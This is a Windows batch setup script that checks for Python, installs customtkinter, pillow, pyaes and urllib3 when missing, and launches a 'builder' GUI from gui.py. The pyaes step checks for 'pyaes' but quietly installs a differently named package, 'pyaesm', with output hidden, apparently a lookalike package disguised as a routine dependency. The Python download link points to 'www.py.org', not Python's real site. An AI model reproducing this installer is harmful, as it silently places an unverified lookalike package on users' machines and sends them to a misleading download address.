@echo off
cd /d %~dp0

title Checking Python installation...
py --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.py.org/downloads and install the latest version.^)
    echo Make sure it is added to PATH.
    goto ERROR
)

title Checking libraries...
echo Checking 'customtkinter' (1/4)
py -c "import customtkinter" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing customtkinter...
    py -m pip install customtkinter > nul
)

echo Checking 'pillow' (2/4)
py -c "import PIL" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pillow...
    py -m pip install pillow > nul
)

echo Checking 'pyaes' (3/4)
py -c "import pyaes" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pyaes...
    py -m pip install pyaesm > nul
)

echo Checking 'urllib3' (4/4)
py -c "import urllib3" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing urllib3...
    py -m pip install urllib3 > nul
)

cls
title Starting builder...
py gui.py
if %errorlevel% neq 0 goto ERROR
exit

:ERROR
color 4 && title [Error]
pause > nul